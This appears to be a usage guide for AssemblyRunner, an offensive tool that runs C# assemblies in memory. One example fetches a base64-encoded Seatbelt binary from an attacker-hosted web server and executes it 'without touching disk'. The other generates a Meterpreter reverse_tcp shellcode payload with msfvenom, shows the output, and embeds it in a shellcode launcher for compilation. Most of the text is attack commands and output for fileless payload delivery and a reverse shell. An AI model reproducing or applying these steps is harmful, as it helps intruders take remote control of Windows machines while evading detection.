EXAMPLE: 
Compile a C# binary, such as https://github.com/GhostPack/Seatbelt, that requires arguments
Goal: Remotely execute a C# Assembly without file touching disk.
Kali: 
cat Seatbelt.exe | base64 -w0 > seatbelt.b64
Host on a webserver like Apache or Python Simple HTTP Server etc.
Windows: 
AssemblyRunner.exe -net http://IP/seatbelt.b64 "BasicOSInfo"
Result: File is retreived over HTTP in-memory, base64 decoded, and then executed

EXAMPLE:
Compile a C# binary, such as AssemblyRunner/AssemblyRunner/Launchers/shellcodelauncher.cs that is included in this repo.
Goal Remotely execute a C# Assembly without touching disk.
Kali:
msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of csharp file: 2615 bytes
byte[] buf = new byte[510] { 0xfc0x48...... }
<SNIPPED>

copy byte length from output, 510 in this example and shellcode between curly braces {} to the shellcodelauncher.cs file
compile this
